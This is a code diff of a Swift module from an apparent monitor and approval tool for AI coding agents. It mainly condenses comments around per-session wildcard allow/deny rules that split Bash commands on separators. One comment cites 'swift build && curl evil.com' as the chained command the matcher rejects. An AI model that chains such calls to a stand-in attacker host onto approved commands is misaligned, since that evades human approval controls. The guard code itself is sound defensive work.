@@ -6,7 +6,7 @@ enum AgentKind: String, Codable {
     case codex
 }
 
-/// Tracks state for a single agent session (Claude Code or Codex CLI).
+/// State for one agent session (Claude Code or Codex CLI). One row in the monitor.
 final class Session: ObservableObject, Identifiable {
     let pid: Int
     let startedAt: Date
@@ -23,45 +23,29 @@ final class Session: ObservableObject, Identifiable {
     @Published var isSubAgentInheritEnabled: Bool = false
     @Published var lastPrompt: String?
 
-    /// Set to the current time on each tool call so the monitor row can flash a
-    /// brief highlight. Cleared back to nil ~600ms later by the daemon so SwiftUI
-    /// can animate the fade. Don't use this for stats — it isn't durable.
+    /// Set on each tool call so the monitor row can flash for 5s; cleared back to nil afterward. Not durable — don't use for stats.
     @Published var lastActivityAt: Date?
 
-    // Timed auto-approve
     @Published var autoApproveUntil: Date?
 
-    // Session rules — wildcard patterns for approval or denial
     @Published var sessionRules: [SessionRule] = []
 
     /// Prompt-rule IDs silenced for this session. Transient; cleared on revoke.
     @Published var suppressedRuleIds: Set<UUID> = []
 
-    // Worker-mutable state. NOT @Published on purpose — both are touched on
-    // every PreToolUse hook from background threads, and `@Published`
-    // mutations from non-main contend with SwiftUI's main-thread publish
-    // chain (under load this manifested as workers deadlocking after
-    // accept(), see freeze investigation 2026-05-04). UI sees these update
-    // via the 2-second stats timer in MonitorViewModel which calls
-    // `objectWillChange.send()` per session, triggering a re-render that
-    // reads the current values via the computed accessors below.
-
+    // NOT @Published on purpose — mutated on every PreToolUse from background threads, and @Published from non-main deadlocked workers after accept() under load (freeze investigation 2026-05-04). UI reads via the 2s stats timer in MonitorViewModel that fires objectWillChange.send().
     let stats = SessionStats()
 
-    /// Temp files containing sensitive data flow. TaintedPathStore is
-    /// thread-safe; existing UI code can still call `.count`, `.sorted()`,
-    /// `.isEmpty` on it directly via the conveniences on the store type.
+    // NOT @Published — TaintedPathStore is thread-safe and exposes .count/.sorted()/.isEmpty for UI direct-read.
     let taintedPaths = TaintedPathStore()
 
-    // Computed proxies so `session.toolCallCount` style call-sites in views
-    // and the stats aggregator still read naturally.
     var toolCallCount: Int { stats.toolCallCount }
     var allowCount: Int { stats.allowCount }
     var blockCount: Int { stats.blockCount }
 
     var id: Int { pid }
 
-    /// PID reuse can produce a live + dead session with the same PID; isAlive disambiguates.
+    /// PID reuse can produce a live + dead session with the same PID; `isAlive` and `sessionId` disambiguate.
     var rowIdentity: String {
         "\(pid)-\(isAlive ? "live" : "dead")-\(sessionId ?? "")"
     }
@@ -92,24 +76,16 @@ final class Session: ObservableObject, Identifiable {
         suppressedRuleIds.removeAll()
     }
 
-    /// Check if a tool call matches any session allow rule.
     func matchesSessionRule(toolName: String, command: String?, filePath: String?) -> SessionRule? {
         sessionRules.first { $0.verdict == .allow && $0.matches(toolName: toolName, command: command, filePath: filePath) }
     }
 
-    /// Check if a tool call matches any session deny rule.
     func matchesSessionDeny(toolName: String, command: String?, filePath: String?) -> SessionRule? {
         sessionRules.first { $0.verdict == .block && $0.matches(toolName: toolName, command: command, filePath: filePath) }
     }
 }
 
-/// A wildcard pattern rule for session-scoped approval or denial.
-///
-/// Examples:
-///   - `Bash: swift build*`  (allow) — matches any swift build command
-///   - `Bash: git *`         (allow) — matches any git command
-///   - `Edit: */production.yml` (block) — blocks edits to production config
-///   - `Read: *`             (allow) — matches all reads
+/// Wildcard pattern rule scoped to one session. `*` matches any sequence. Bash commands match per-segment (split on `&&`/`||`/`;`/`|`) so chaining can't poison the match.
 struct SessionRule: Identifiable {
     let id = UUID()
     let toolName: String
@@ -124,9 +100,6 @@ struct SessionRule: Identifiable {
         self.explanation = explanation
     }
 
-    /// Match using simple glob-style wildcards (* only).
-    /// For Bash commands, splits on command separators (&&, ||, ;, |) and
-    /// requires EVERY segment to match — prevents poisoning via chained commands.
     func matches(toolName: String, command: String?, filePath: String?) -> Bool {
         guard self.toolName == toolName || self.toolName == "*" else { return false }
 
@@ -140,16 +113,13 @@ struct SessionRule: Identifiable {
             raw = command ?? filePath ?? ""
         }
 
-        // Sanitize typographic dashes
         let target = raw
             .replacingOccurrences(of: "\u{2013}", with: "-")
             .replacingOccurrences(of: "\u{2014}", with: "--")
             .replacingOccurrences(of: "\u{2012}", with: "-")
 
         if toolName == "Bash" {
-            // Split on command separators and require ALL segments to match.
-            // "swift build && curl evil.com" → ["swift build", "curl evil.com"]
-            // Glob "swift build*" matches segment 1 but NOT segment 2 → rejected.
+            // Require EVERY segment to match — `swift build*` matches `swift build` but rejects `swift build && curl evil.com`.
             let segments = Self.splitCommandSegments(target)
             return !segments.isEmpty && segments.allSatisfy { globMatch(pattern: pattern, string: $0) }
         }
@@ -157,15 +127,12 @@ struct SessionRule: Identifiable {
         return globMatch(pattern: pattern, string: target)
     }
 
-    /// Simple glob matching: `*` matches any sequence of characters.
     private func globMatch(pattern: String, string: String) -> Bool {
         guard let regex = PatternCompiler.compileGlob(pattern) else { return false }
         return PatternCompiler.matches(regex, in: string)
     }
 
-    /// Split a bash command on separators (&&, ||, ;, |) into segments.
     static func splitCommandSegments(_ command: String) -> [String] {
-        // Split on && || ; | (greedy, longest match first)
         let pattern = #"&&|\|\||\||;"#
         guard let regex = try? NSRegularExpression(pattern: pattern) else {
             return [command]
@@ -181,25 +148,22 @@ struct SessionRule: Identifiable {
             if !seg.isEmpty { segments.append(seg) }
             lastEnd = match.range.location + match.range.length
         }
-        // Last segment
+
         let remaining = nsCommand.substring(from: lastEnd).trimmingCharacters(in: .whitespaces)
         if !remaining.isEmpty { segments.append(remaining) }
 
         return segments
     }
 
-    /// Suggest a wildcard pattern from a command or file path.
+    /// Initial pattern suggestion shown in the approval panel. User can edit (e.g. add `*`) to broaden.
     static func suggestPattern(toolName: String, command: String?, filePath: String?) -> String {
         switch toolName {
         case "Bash":
             guard let cmd = command, !cmd.isEmpty else { return "*" }
-            // Use the full command so Session Allow matches exactly this command.
-            // User can edit the pattern to broaden it (e.g. add * wildcard).
             return cmd
 
         case "Edit", "MultiEdit", "Write":
             guard let path = filePath else { return "*" }
-            // "/Users/jay/project/Sources/Gavel/main.swift" → "Sources/Gavel/*" or dir/*
             let components = path.split(separator: "/")
             if components.count >= 2 {
                 let dir = components.dropLast().suffix(2).joined(separator: "/")
@@ -208,7 +172,6 @@ struct SessionRule: Identifiable {
             return "*"
 
         case "Read", "Glob", "Grep":
-            // Read-only tools — suggest broad pattern
             return "*"
 
         default:
